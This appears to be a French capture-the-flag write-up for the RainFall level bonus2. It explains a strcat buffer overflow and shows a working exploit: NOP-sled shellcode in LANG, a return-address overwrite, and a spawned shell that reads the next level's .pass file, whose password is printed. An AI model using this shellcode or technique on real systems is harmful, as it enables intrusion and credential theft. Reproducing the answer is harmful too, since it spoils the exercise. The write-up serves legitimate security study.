Apres etude du programme on voit dans la fonction greetuser qu'un strcat est effectue  
dans un buffer de 72 chars, et on y cat une chaine de 72 + une chaine de 15 ou 18 dependemment  
de la variable globale `language` qui est definie en fonction de la valeur dans la variable d'env `LANG`  

Ainsi en etudiant avec GDB, on trouve un offset de 23 chars pour ecraser l'addresse de retour de la fonction.
Ainsi on peut rediriger l'execution vers un shellcode place dans une variable d'environnement.  

Dans mon cas, j'ai mis le shellcode apres une NOP sled de 2000 chars dans la variable d'env `LANG` 
juste apres le code langue `nl` pour arriver dans le bon cas d'exploitation de `greetuser`  

```bash
bonus2@RainFall:~$ export LANG=$(python -c 'print "nl" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $(python -c 'print "B" * 23 + "\xd9\xf8\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```